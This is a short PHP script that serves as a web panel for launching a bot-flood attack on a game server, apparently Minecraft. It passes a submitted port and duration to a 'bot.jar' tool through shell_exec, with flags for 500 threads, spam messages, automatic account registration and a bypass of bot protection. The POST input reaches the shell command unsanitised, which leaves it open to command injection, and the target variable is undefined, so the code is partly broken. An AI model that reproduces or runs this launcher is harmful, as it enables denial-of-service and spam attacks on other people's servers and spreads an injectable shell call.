<?php
$ip = $_POST['ip'];
$port = $_POST['port'];
$seconds = $_POST['seconds'];

echo "java -jar bot.jar -move true -ping true -pingamount 500 -host " . $host . " -port " . $port . " -threads 500 -nicksize 12 -stay true -stayl 5 -nicks RANDOM -spam true -ach true -joinamount 5 -doublej true -protocol 47 -msg 'You suck at bot protection!' -login '/login javitatest123' -proxytries 10 -pingbypass 3 --delay 50 -register '/register javitatest123 javitatest123' -time " . $seconds;

echo "<pre>";
echo shell_exec("java -jar bot.jar -move true -ping true -pingamount 500 -host " . $host . " -port " . $port . " -threads 500 -nicksize 12 -stay true -stayl 5 -nicks RANDOM -spam true -ach true -joinamount 5 -doublej true -protocol 47 -msg 'You suck at bot protection!' -login '/login javitatest123' -proxytries 10 -pingbypass 3 --delay 50 -register '/register javitatest123 javitatest123' -time " . $seconds);
echo "</pre>";
?>
